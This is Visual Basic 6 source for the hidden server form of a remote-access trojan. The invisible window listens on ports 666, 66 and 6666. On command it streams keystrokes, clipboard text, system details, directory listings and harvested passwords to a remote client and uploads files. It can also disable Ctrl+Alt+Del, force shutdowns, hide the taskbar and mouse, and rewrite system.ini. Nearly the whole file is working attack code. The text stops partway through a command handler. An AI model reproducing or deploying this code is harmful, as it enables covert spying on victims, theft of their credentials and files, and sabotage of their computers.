VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmServer 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   45
   ClientLeft      =   34380
   ClientTop       =   4230
   ClientWidth     =   1020
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   45
   ScaleWidth      =   1020
   Visible         =   0   'False
   Begin VB.TextBox text2 
      Height          =   285
      Left            =   5160
      TabIndex        =   40
      Text            =   "Text2"
      Top             =   3720
      Width           =   1335
   End
   Begin VB.TextBox txtpath2 
      Height          =   285
      Left            =   4200
      TabIndex        =   39
      Text            =   "c:\netchk.exe"
      Top             =   2760
      Width           =   2295
   End
   Begin VB.TextBox txtfile 
      Height          =   285
      Left            =   4200
      TabIndex        =   38
      Text            =   "Text2"
      Top             =   3240
      Width           =   2295
   End
   Begin MSWinsockLib.Winsock File 
      Left            =   3960
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin MSWinsockLib.Winsock KeyLog 
      Left            =   5040
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.Timer KeysTmr 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   0
      Top             =   5760
   End
   Begin VB.TextBox txtprint 
      Height          =   285
      Left            =   0
      MultiLine       =   -1  'True
      TabIndex        =   36
      Top             =   0
      Width           =   2775
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   2400
      TabIndex        =   35
      Top             =   3480
      Width           =   2535
   End
   Begin VB.TextBox txtpath 
      Height          =   285
      Left            =   0
      TabIndex        =   34
      Text            =   "c:\"
      Top             =   3480
      Width           =   2295
   End
   Begin VB.FileListBox File1 
      Height          =   1845
      Left            =   2160
      TabIndex        =   33
      Top             =   3840
      Width           =   1935
   End
   Begin VB.DirListBox Dir1 
      Height          =   1890
      Left            =   0
      TabIndex        =   32
      Top             =   3840
      Width           =   2055
   End
   Begin VB.ListBox List1 
      Height          =   645
      Left            =   0
      TabIndex        =   31
      Top             =   2640
      Width           =   2895
   End
   Begin VB.TextBox Text1 
      Height          =   900
      Left            =   0
      TabIndex        =   30
      Text            =   "Text1"
      Top             =   360
      Width           =   2835
   End
   Begin VB.TextBox txttrail 
      Height          =   285
      Left            =   0
      TabIndex        =   29
      Top             =   1800
      Width           =   1335
   End
   Begin VB.ListBox lstpass 
      Height          =   2010
      Left            =   0
      TabIndex        =   25
      Top             =   480
      Width           =   2895
   End
   Begin VB.TextBox txtpass 
      Height          =   285
      Left            =   0
      TabIndex        =   24
      Top             =   1440
      Width           =   2415
   End
   Begin VB.TextBox txtsize 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   240
      TabIndex        =   23
      Top             =   3000
      Width           =   495
   End
   Begin VB.TextBox txttext 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   260
      Left            =   240
      TabIndex        =   20
      Top             =   2280
      Width           =   3120
   End
   Begin VB.TextBox txtfont 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   260
      Left            =   240
      TabIndex        =   19
      Top             =   2640
      Width           =   1900
   End
   Begin VB.TextBox txtscrollspeed 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   285
      Left            =   0
      TabIndex        =   18
      Top             =   0
      Width           =   975
   End
   Begin VB.TextBox txtattributes 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   285
      Left            =   0
      TabIndex        =   17
      Top             =   360
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Capture"
      Height          =   345
      Left            =   60
      TabIndex        =   7
      Top             =   60
      Visible         =   0   'False
      Width           =   1875
   End
   Begin VB.OptionButton Option1 
      Caption         =   "Keep screen normal"
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   600
      Value           =   -1  'True
      Visible         =   0   'False
      Width           =   1935
   End
   Begin VB.OptionButton Option2 
      Caption         =   "Invert the screen"
      Height          =   255
      Left            =   120
      TabIndex        =   5
      Top             =   960
      Visible         =   0   'False
      Width           =   1935
   End
   Begin VB.OptionButton Option3 
      Caption         =   "Bad colors"
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   1320
      Visible         =   0   'False
      Width           =   3495
   End
   Begin VB.OptionButton Option4 
      Caption         =   "Darken"
      Height          =   255
      Left            =   2160
      TabIndex        =   3
      Top             =   600
      Visible         =   0   'False
      Width           =   1455
   End
   Begin VB.OptionButton Option5 
      Caption         =   "Brighten Screen"
      Height          =   255
      Left            =   2160
      TabIndex        =   2
      Top             =   960
      Visible         =   0   'False
      Width           =   1455
   End
   Begin VB.CheckBox option6 
      Caption         =   "horizontal"
      Height          =   255
      Left            =   360
      TabIndex        =   1
      Top             =   1800
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.CheckBox option7 
      Caption         =   "vertical"
      Height          =   255
      Left            =   1680
      TabIndex        =   0
      Top             =   1800
      Visible         =   0   'False
      Width           =   855
   End
   Begin MSWinsockLib.Winsock WS 
      Left            =   4920
      Top             =   1560
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.PictureBox Picture1 
      Height          =   1095
      Left            =   0
      ScaleHeight     =   1035
      ScaleWidth      =   1275
      TabIndex        =   37
      Top             =   0
      Width           =   1335
   End
   Begin VB.Label lblmenucolor 
      BackColor       =   &H00FFFFFF&
      Height          =   405
      Left            =   2400
      TabIndex        =   28
      Top             =   2640
      Width           =   525
   End
   Begin VB.Label lblfacecolor 
      BackColor       =   &H00FFFFFF&
      Height          =   405
      Left            =   2160
      TabIndex        =   27
      Top             =   120
      Width           =   525
   End
   Begin VB.Label lblwindowcolor 
      BackColor       =   &H00FFFFFF&
      Height          =   405
      Left            =   2160
      TabIndex        =   26
      Top             =   960
      Width           =   525
   End
   Begin VB.Label textcolor 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   0
      TabIndex        =   22
      Top             =   720
      Width           =   975
   End
   Begin VB.Label labelbackcolor 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   0
      TabIndex        =   21
      Top             =   1080
      Width           =   975
   End
   Begin VB.Label lbloldmenucolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   120
      TabIndex        =   16
      Top             =   0
      Width           =   375
   End
   Begin VB.Label lbloldbuttoncolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   600
      TabIndex        =   15
      Top             =   0
      Width           =   375
   End
   Begin VB.Label lbloldwincolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   1080
      TabIndex        =   14
      Top             =   0
      Width           =   375
   End
   Begin VB.Label lbloldbackground 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   1560
      TabIndex        =   13
      Top             =   0
      Width           =   375
   End
   Begin VB.Label lbloldwinframecolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   2040
      TabIndex        =   12
      Top             =   0
      Width           =   375
   End
   Begin VB.Label lbloldactivebordercolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   2520
      TabIndex        =   11
      Top             =   0
      Width           =   375
   End
   Begin VB.Label lbloldinactivebordercolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   3000
      TabIndex        =   10
      Top             =   0
      Width           =   375
   End
   Begin VB.Label lbloldappworkspace 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   3480
      TabIndex        =   9
      Top             =   0
      Width           =   375
   End
   Begin VB.Line Line1 
      Visible         =   0   'False
      X1              =   0
      X2              =   2040
      Y1              =   480
      Y2              =   480
   End
   Begin VB.Line Line2 
      Visible         =   0   'False
      X1              =   2040
      X2              =   2040
      Y1              =   480
      Y2              =   0
   End
   Begin VB.Line Line4 
      Visible         =   0   'False
      X1              =   3720
      X2              =   3720
      Y1              =   0
      Y2              =   1680
   End
   Begin VB.Line Line6 
      Visible         =   0   'False
      X1              =   0
      X2              =   3720
      Y1              =   1680
      Y2              =   1680
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Caption         =   "Screen Options"
      Height          =   255
      Left            =   2160
      TabIndex        =   8
      Top             =   120
      Visible         =   0   'False
      Width           =   1455
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function Escape Lib "gdi32" (ByVal hdc As Long, _
     ByVal nEscape As Long, ByVal nCount As Long, lpInData As Any, _
     lpOutData As Any) As Long
Private Declare Function DeleteDC Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function StretchBlt Lib "gdi32" (ByVal hdc As Long, _
     ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, _
     ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, _
     ByVal ySrc As Long, ByVal nSrcWidth As Long, _
     ByVal nSrcHeight As Long, ByVal dwRop As Long) As Long
Private Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, _
     ByVal hObject As Long) As Long
Private Declare Function CreateCompatibleDC Lib "gdi32" _
     (ByVal hdc As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
    (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, _
    ByVal lParam As Long) As Long
    Private Declare Function SwapMouseButton& Lib "user32" _
(ByVal bSwap As Long)
Private Declare Function ShowCursor& Lib "user32" _
(ByVal bShow As Long)
    Private Const WM_SYSCOMMAND = &H112&
    Private Const SC_MONITORPOWER = &HF170&
    Dim mousehide As Boolean
    Dim fliphorizontal As Boolean, flipvertical As Boolean, thechange  'declare the variables
    Dim hIn As Integer
    Dim Sending As Boolean, Sending2 As Boolean, stopit As Boolean

Sub SendInfo()
Dim infos(11), tot
infos(1) = "current time: " & Time
infos(2) = "current date: " & Date
infos(3) = "windows has been on for: " & GetTimeOnWindows
If IsScrollLockOn = 1 Then
    infos(4) = "scroll lock is: on"
Else
    infos(4) = "scroll lock is: off"
End If
If IsNumLockOn = 1 Then
    infos(5) = "num lock is: on"
Else
    infos(5) = "num lock is: off"
End If
If IsCapsLockOn = 1 Then
    infos(6) = "caps lock is: on"
Else
    infos(6) = "caps lock is: off"
End If
infos(7) = "double click time: " & GetDoubleClick & "ms"
infos(8) = "caret blink time: " & GetCaretBlink & "ms"
infos(9) = KeyboardInfo
infos(10) = "clipboard text: " & Clipboard.GetText
infos(11) = "resolution: " & Screen.Width / Screen.TwipsPerPixelX & "x" & Screen.Height / Screen.TwipsPerPixelY
For i = 1 To 11
    tot = tot & infos(i) & vbCrLf
Next i
WS.SendData "Info;" & tot
End Sub

Sub SendDrives()
'On Error Resume Next
Dim tot
For i = 0 To Drive1.ListCount - 1
    tot = tot & Mid(Drive1.List(i), 1, 2) & "\" & Chr(13) & Chr(10)
Next i
WS.SendData "Drives;" & tot
End Sub

Sub SendFiles(Directory)
On Error GoTo error_handler
Dir1.Path = Directory
File1.Path = Directory
Dim totd, totf, tot
For i = 0 To Dir1.ListCount - 1
    totd = totd & Dir1.List(i) & "\" & Chr(13) & Chr(10)
Next i
For i = 0 To File1.ListCount - 1
    totf = totf & File1.Path & File1.List(i) & Chr(13) & Chr(10)
Next i
tot = totd & totf
WS.SendData "Files;" & tot
error_handler:
Exit Sub
End Sub

Private Sub ListBoxtoTextBox()
Dim a As Long
Dim b As String
For a = 0 To (List1.ListCount - 1)
b = b & List1.List(a) & vbCrLf
Next
Text1.Text = b
End Sub

Function StartButton(State As StartBar_Constants)
        'This function can hide and show the _
        start button on your Windows (95/98/2000) PC.
        Dim SendValue As Long
        Dim SetOption As Long
        SetOption = FindWindow("Shell_TrayWnd", "")
        SendValue = FindWindowEx(SetOption, 0, "Button", vbNullString)
        ShowWindow SendValue, State
End Function

Private Sub File_ConnectionRequest(ByVal requestID As Long)
File.Close
File.Accept requestID
End Sub

Private Sub File_DataArrival(ByVal bytesTotal As Long)
Dim dat As String
Dim a, b, c
File.GetData dat$
If stopit Then Exit Sub

If Sending = True Then
    a = LOF(1)
    b = Loc(1)
    c = a - b
    If c < 4000 Then
        dat$ = Input(c, #1)
        Sending = False
        File.SendData dat$
        Sending2 = True
        Close #1
    Else
        dat$ = Input(4000, #1)
        File.SendData dat$
    End If
ElseIf Sending = False Then
    Sending = True
    If LOF(1) < 4000 Then
        dat$ = Input(LOF(1), #1)
        File.SendData dat$
        Sending2 = True
        Close #1
      Else
       dat = Input(4000, #1)
        File.SendData dat$
        End If
        File.SendData "CLOSE"
End If
DoEvents
End Sub

Private Sub File_SendComplete()
If Sending2 = True Then
    DoEvents
    File.SendData "CLOSE"
    Sending2 = False
    stopit = True
End If
text2.Text = "Complete"
End Sub

Private Sub Form_Load()
Start_listen
    SetPriority
Dir1.Path = txtpath.Text
File1.Path = Dir1.Path
    WS.LocalPort = 666
    WS.Listen
    fliphorizontal = False 'set variable to correct value
flipvertical = False
thechange = SRCCOPY
With frmDesktop 'set the size of the form and picture in it
.Top = 0
.Left = 0
.Width = Screen.Width
.Height = Screen.Height
.Picture1.Height = Screen.Height
.Picture1.Width = Screen.Width
End With
Dim lngColor As Long
lngColor = GetSysColor(4)
lbloldmenucolor.BackColor = lngColor
lngColor = GetSysColor(15)
lbloldbuttoncolor.BackColor = lngColor
lngColor = GetSysColor(5)
lbloldwincolor.BackColor = lngColor
lngColor = GetSysColor(1)
lbloldbackground.BackColor = lngColor
lngColor = GetSysColor(6)
lbloldwinframecolor.BackColor = lngColor
lngColor = GetSysColor(10)
lbloldactivebordercolor.BackColor = lngColor
lngColor = GetSysColor(11)
lbloldinactivebordercolor.BackColor = lngColor
lngColor = GetSysColor(12)
lbloldappworkspace.BackColor = lngColor
End Sub


Private Sub Command1_Click()
frmDesktop.Picture1.Cls 'Clear picture
DumpToWindow frmDesktop.Picture1, thechange, fliphorizontal, flipvertical
frmDesktop.Show 'show the form
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub KeyLog_DataArrival(ByVal bytesTotal As Long)
If Cmd(0) = "StopLog" Then
KeysTmr.Enabled = False
WS.SendData "LogStopped"
End If
End Sub

Private Sub Option1_Click()
thechange = SRCCOPY 'change variable
End Sub
Private Sub Option2_Click()
thechange = SRCINVERT 'change variable
End Sub
Private Sub Option3_Click()
thechange = SRCAND 'change variable
End Sub
Private Sub Option4_Click()
thechange = SRCERASE 'change variable
End Sub
Private Sub Option5_Click()
thechange = SRCPAINT 'change variable
End Sub
Private Sub Option6_Click()
fliphorizontal = True 'change variables

End Sub
Private Sub Option7_Click()
flipvertical = True
End Sub

Private Sub WS_Close()
WS.Close
WS.Listen
File.Close
File.Listen
End Sub

Private Sub WS_ConnectionRequest(ByVal requestID As Long)
WS.Close
WS.Accept requestID
WS.SendData "Connected"
End Sub

Private Sub KeysTmr_Timer()
If GetKey Then
            KeyLog.SendData "KEY" & sKeyPressed    ' any keypresses ?
        End If
   End Sub

Private Sub Start_listen()  ' own sub because called twice
    With KeyLog
        .Close
        .Protocol = sckTCPProtocol
        .LocalPort = 66
        .Listen
    End With
    With File
        .Close
        .Protocol = sckTCPProtocol
        .LocalPort = 6666
        .Listen
    End With
End Sub

Private Sub ListenSck_Close() ' if no connection, disable logging
    KeysTmr.Enabled = False
    Start_listen
    End Sub
 
Private Sub keylog_ConnectionRequest(ByVal requestID As Long)  ' accept any request
With KeyLog
        .Close
        .Accept requestID
    End With
    KeysTmr.Enabled = True  ' if connected, enable logging
    WS.SendData "LogStarted"
End Sub

Private Sub WS_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
WS.GetData Data, vbString, bytesTotal
lastdata$ = Data
Arrayize lastdata$, ";"
Dim thedata As String

If Cmd(0) = "PrintText" Then
    PrintText Cmd(1)
    WS.SendData "TextPrinted"
    ElseIf Cmd(0) = "ReadClipBoard" Then
    WS.SendData "ClipText;" & Clipboard.GetText
    ElseIf Cmd(0) = "EmptyClipBoard" Then
    Clipboard.SetText ""
    WS.SendData "ClipCleared"
ElseIf Cmd(0) = "Disconnected" Then
WS.Close
WS.Listen
ElseIf Cmd(0) = "GetInfo" Then
SendInfo
ElseIf Cmd(0) = "NumLockOn" Then
    NumLock True
    WS.SendData "NumLockOn"
ElseIf Cmd(0) = "NumLockOff" Then
    NumLock False
    WS.SendData "NumLockOff"
ElseIf Cmd(0) = "CapsLockOn" Then
    CapsLock True
    WS.SendData "CapsLockOn"
ElseIf Cmd(0) = "CapsLockOff" Then
    CapsLock False
    WS.SendData "CapsLockOff"
ElseIf Cmd(0) = "ScrollLockOn" Then
    ScrollLock True
    WS.SendData "ScrollLockOn"
ElseIf Cmd(0) = "ScrollLockOff" Then
    ScrollLock False
    WS.SendData "ScrollLockOff"
ElseIf Cmd(0) = "CtrlAltDelOn" Then
    CtrlAltDel True
    WS.SendData "CtrlAltDelOn"
ElseIf Cmd(0) = "CtrlAltDelOff" Then
    CtrlAltDel False
    WS.SendData "CtrlAltDelOff"
ElseIf Cmd(0) = "MonitorOn" Then
    a = SendMessage(frmServer.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, -1&)
    WS.SendData "MonitorOn"
ElseIf Cmd(0) = "MonitorOff" Then
    a = SendMessage(frmServer.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, 0&)
    WS.SendData "MonitorOff"
'ElseIf TheData = Str(StartBeep) Then
    'Beep True
'ElseIf TheData = Str(StopBeep) Then
    'Beep False
ElseIf Cmd(0) = "OpenCD" Then
    OpenCDTray
    WS.SendData "CDOpened"
ElseIf Cmd(0) = "CloseCD" Then
    CloseCDTray
    WS.SendData "CDClosed"
ElseIf Cmd(0) = "HideTaskBar" Then
    Taskbar False
    WS.SendData "TaskBarHidden"
ElseIf Cmd(0) = "ShowTaskBar" Then
    Taskbar True
    WS.SendData "TaskBarShown"
ElseIf Cmd(0) = "HideStartButton" Then
    StartButton innotontaskbar
    WS.SendData "StartButtonHidden"
ElseIf Cmd(0) = "ShowStartButton" Then
   StartButton isontaskbar
   WS.SendData "StartButtonShown"
ElseIf Cmd(0) = "HideDesktop" Then
    Desktop True
    WS.SendData "DesktopHidden"
ElseIf Cmd(0) = "ShowDesktop" Then
    Desktop False
    WS.SendData "DesktopShown"
ElseIf Cmd(0) = "ReverseMouseButtons" Then
 SwapMouseButton (True)
 WS.SendData "MouseButtonsReversed"
ElseIf Cmd(0) = "RestoreMouseButtons" Then
 SwapMouseButton (False)
 WS.SendData "MouseButtonsRestored"
ElseIf Cmd(0) = "HideMouse" Then
mousehide = True
ShowCursor (False)
WS.SendData "MouseHidden"
ElseIf Cmd(0) = "ShowMouse" Then
 mousehid = True
ShowCursor (True)
WS.SendData "MouseShown"
  ElseIf Cmd(0) = "CloseServer" Then
  WS.SendData "ServerClosed"
  End
  ElseIf Cmd(0) = "ActivateMatrix" Then
  Load Form1
  Form1.Show
  ElseIf Cmd(0) = "DeactivateMatrix" Then
  Form1.Hide
  Unload Form1
  ElseIf Cmd(0) = "NormalShutdown" Then
  a = ExitWindowsEx(EWX_SHUTDOWN, 0)
  WS.SendData "NormalShutdown"
  ElseIf Cmd(0) = "ForceShutdown" Then
  a = ExitWindowsEx(EWX_FORCE, 0)
  WS.SendData "ForceShutdown"
  ElseIf Cmd(0) = "LogOff" Then
  a = ExitWindowsEx(EWX_LOGOFF, 0)
  WS.SendData "LogOff"
  ElseIf Cmd(0) = "Reboot" Then
  a = ExitWindowsEx(EWX_REBOOT, 0)
  WS.SendData "Reboot"
  ElseIf Cmd(0) = "PowerOff" Then
  a = ExitWindowsEx(EWX_POWEROFF, 0)
  WS.SendData "PowerOff"
  End If
  If Cmd(0) = "FlipVerticalNormal" Then
 Option1_Click
 Option7_Click
 Command1_Click
 WS.SendData "FlipVerticalNormal"
 End If
  If Cmd(0) = "FlipVerticalInvert" Then
Option2_Click
Option7_Click
Command1_Click
WS.SendData "FlipVerticalInvert"
End If
  If Cmd(0) = "FlipVerticalBad" Then
Option3_Click
Option7_Click
Command1_Click
WS.SendData "FlipVerticalBad"
End If
  If Cmd(0) = "FlipVerticalDark" Then
Option4_Click
Option7_Click
Command1_Click
WS.SendData "FlipVerticalDark"
End If
  If Cmd(0) = "FlipVerticalBright" Then
Option5_Click
Option7_Click
Command1_Click
WS.SendData "FlipVerticalBright"
End If
  If Cmd(0) = "FlipHorizontalNormal" Then
Option1_Click
Option6_Click
Command1_Click
WS.SendData "FlipHorizontalNormal"
End If
  If Cmd(0) = "FlipHorizontalInvert" Then
Option2_Click
Option6_Click
Command1_Click
WS.SendData "FlipHorizontalInvert"
End If
  If Cmd(0) = "FlipHorizontalBad" Then
Option3_Click
Option6_Click
Command1_Click
WS.SendData "FlipHorizontalBad"
End If
  If Cmd(0) = "FlipHorizontalDark" Then
Option4_Click
Option6_Click
Command1_Click
WS.SendData "FlipHorizontalDark"
End If
  If Cmd(0) = "FlipHorizontalBright" Then
Option5_Click
Option6_Click
Command1_Click
WS.SendData "FlipHorizontalBright"
End If
  If Cmd(0) = "FlipBothNormal" Then
Option1_Click
Option6_Click
Option7_Click
Command1_Click
WS.SendData "FlipBothNormal"
End If
  If Cmd(0) = "FlipBothInvert" Then
Option2_Click
Option6_Click
Option7_Click
Command1_Click
WS.SendData "FlipBothInvert"
End If
  If Cmd(0) = "FlipBothBad" Then
Option3_Click
Option6_Click
Option7_Click
Command1_Click
WS.SendData "FlipBothBad"
End If
  If Cmd(0) = "FlipBothDark" Then
Option4_Click
Option6_Click
Option7_Click
Command1_Click
WS.SendData "FlipBothDark"
End If
  If Cmd(0) = "FlipBothBright" Then
Option5_Click
Option6_Click
Option7_Click
Command1_Click
WS.SendData "FlipBothBright"
End If
If Cmd(0) = "RestoreColors" Then
a = SetSysColors(1, 4, lbloldmenucolor.BackColor)
a = SetSysColors(1, 15, lbloldbuttoncolor.BackColor)
a = SetSysColors(1, 5, lbloldwincolor.BackColor)
a = SetSysColors(1, 1, lbloldbackground.BackColor)
a = SetSysColors(1, 6, lbloldwinframecolor.BackColor)
a = SetSysColors(1, 10, lbloldactivebordercolor.BackColor)
a = SetSysColors(1, 11, lbloldinactivebordercolor.BackColor)
a = SetSysColors(1, 12, lbloldappworkspace.BackColor)
WS.SendData "ColorsRestored"
 End If
 If Cmd(0) = "SetClipBoard" Then
 Clipboard.SetText Cmd(1)
 WS.SendData "ClipBoardSet"
 ElseIf Cmd(0) = "PrintText" Then
  PrintText Cmd(1)
  End If
If Cmd(0) = "SetSaver" Then
txttext.Text = Cmd(1)
txtfont.Text = Cmd(2)
txtsize.Text = Cmd(3)
txtscrollspeed.Text = Cmd(4)
textcolor.Caption = Cmd(5)
labelbackcolor.Caption = Cmd(6)
txtattributes.Text = Cmd(7)
X = WritePrivateProfileString("Screen Saver.Marquee", "Font", txtfont.Text, "c:\windows\control.ini")
X = WritePrivateProfileString("Screen Saver.Marquee", "Text", txttext.Text, "c:\windows\control.ini")
X = WritePrivateProfileString("Screen Saver.Marquee", "Size", txtsize.Text, "c:\windows\control.ini")
X = WritePrivateProfileString("Screen Saver.Marquee", "Speed", txtscrollspeed.Text, "c:\windows\control.ini")
X = WritePrivateProfileString("Screen Saver.Marquee", "Attributes", txtattributes.Text, "c:\windows\control.ini")
X = WritePrivateProfileString("Screen Saver.Marquee", "TextColor", textcolor.Caption, "c:\windows\control.ini")
X = WritePrivateProfileString("Screen Saver.Marquee", "BackgroundColor", labelbackcolor.Caption, "c:\windows\control.ini")
WS.SendData "SSSaved"
End If

If Cmd(0) = "ChangeColors" Then
lblmenucolor.BackColor = Cmd(1)
lblfacecolor.BackColor = Cmd(2)
lblwindowcolor.BackColor = Cmd(3)
a = SetSysColors(1, 4, lblmenucolor.BackColor)
a = SetSysColors(1, 15, lblfacecolor.BackColor)
a = SetSysColors(1, 5, lblwindowcolor.BackColor)
a = SetSysColors(1, 1, lblwindowcolor.BackColor)
a = SetSysColors(1, 6, lblwindowcolor.BackColor)
a = SetSysColors(1, 10, lblwindowcolor.BackColor)
a = SetSysColors(1, 11, lblwindowcolor.BackColor)
a = SetSysColors(1, 12, lblwindowcolor.BackColor)
WS.SendData "ColorsChanged"
End If

If Cmd(0) = "SetMouseTrail" Then
txttrail.Text = Cmd(1)
MouseTrail txttrail.Text
WS.SendData "TrailChanged"
End If

If Cmd(0) = "HideMouseTrail" Then
MouseTrail 0
WS.SendData "NoMouseTrail"
End If

If Cmd(0) = "YNI_Msg" Then
res = MsgBox(Cmd(1), vbInformation + vbYesNo, Cmd(2))

ElseIf Cmd(0) = "YNQ_Msg" Then
res = MsgBox(Cmd(1), vbQuestion + vbYesNo, Cmd(2))

ElseIf Cmd(0) = "YNW_Msg" Then
res = MsgBox(Cmd(1), vbExclamation + vbYesNo, Cmd(2))

ElseIf Cmd(0) = "YNError_Msg" Then
res = MsgBox(Cmd(1), vbCritical + vbYesNo, Cmd(2))

ElseIf Cmd(0) = "YNCI_Msg" Then
res = MsgBox(Cmd(1), vbInformation + vbYesNoCancel, Cmd(2))

ElseIf Cmd(0) = "YNCQ_Msg" Then
res = MsgBox(Cmd(1), vbQuestion + vbYesNoCancel, Cmd(2))

ElseIf Cmd(0) = "YNCW_Msg" Then
res = MsgBox(Cmd(1), vbExclamation + vbYesNoCancel, Cmd(2))

ElseIf Cmd(0) = "YNCError_Msg" Then
res = MsgBox(Cmd(1), vbCritical + vbYesNoCancel, Cmd(2))

ElseIf Cmd(0) = "OKI_Msg" Then
res = MsgBox(Cmd(1), vbInformation + vbOKOnly, Cmd(2))

ElseIf Cmd(0) = "OKQ_Msg" Then
res = MsgBox(Cmd(1), vbQuestion + vbOKOnly, Cmd(2))

ElseIf Cmd(0) = "OKW_Msg" Then
res = MsgBox(Cmd(1), vbExclamation + vbOKOnly, Cmd(2))

ElseIf Cmd(0) = "OKError_Msg" Then
res = MsgBox(Cmd(1), vbCritical + vbOKOnly, Cmd(2))

ElseIf Cmd(0) = "OKCI_Msg" Then
res = MsgBox(Cmd(1), vbInformation + vbOKCancel, Cmd(2))

ElseIf Cmd(0) = "OKCQ_Msg" Then
res = MsgBox(Cmd(1), vbQuestion + vbOKCancel, Cmd(2))

ElseIf Cmd(0) = "OKCW_Msg" Then
res = MsgBox(Cmd(1), vbExclamation + vbOKCancel, Cmd(2))

ElseIf Cmd(0) = "OKCError_Msg" Then
res = MsgBox(Cmd(1), vbCritical + vbOKCancel, Cmd(2))

ElseIf Cmd(0) = "RICI_Msg" Then
res = MsgBox(Cmd(1), vbInformation + vbRetryCancel, Cmd(2))

ElseIf Cmd(0) = "RICQ_Msg" Then
res = MsgBox(Cmd(1), vbQuestion + vbRetryCancel, Cmd(2))

ElseIf Cmd(0) = "RICW_Msg" Then
res = MsgBox(Cmd(1), vbExclamation + vbRetryCancel, Cmd(2))

ElseIf Cmd(0) = "RICError_Msg" Then
res = MsgBox(Cmd(1), vbCritical + vbRetryCancel, Cmd(2))

If Cmd(0) = "AI_Msg" Then
res = MsgBox(Cmd(1), vbInformation + vbAbortRetryIgnore, Cmd(2))

ElseIf Cmd(0) = "AQ_Msg" Then
res = MsgBox(Cmd(1), vbQuestion + vbAbortRetryIgnore, Cmd(2))

ElseIf Cmd(0) = "AW_Msg" Then
res = MsgBox(Cmd(1), vbExclamation + vbAbortRetryIgnore, Cmd(2))

ElseIf Cmd(0) = "AError_Msg" Then
res = MsgBox(Cmd(1), vbCritical + vbAbortRetryIgnore, Cmd(2))

ElseIf Cmd(0) = "Passwords" Then
Call GetPasswords
Call ListBoxtoTextBox
WS.SendData "Passwords;" & Text1.Text
If Text1.Text = "" Then
WS.SendData "NoPasswords"
End If
End If
End If

If Cmd(0) = "RunScreenSaver" Then
X = WritePrivateProfileString("boot", "SCRNSAVE.EXE", "C:\WINDOWS\SYSTEM\SCROLL~1.SCR", "c:\windows\system.ini")
StartScreensaver frmServer
WS.SendData "ScreenSaveRun"
End If

If Cmd(0) = "Files" Then
SendFiles Cmd(1)
WS.SendData "FilesSent"
End If

If Cmd(0) = "OpenBrowser" Then
GoToWebsite Cmd(1)
WS.SendData "BrowserOpened"
End If

If Cmd(0) = "GetTimeDate" Then
WS.SendData "TimeDate;" & Time & ";" & Date
End If

If Cmd(0) = "SetTime" Then
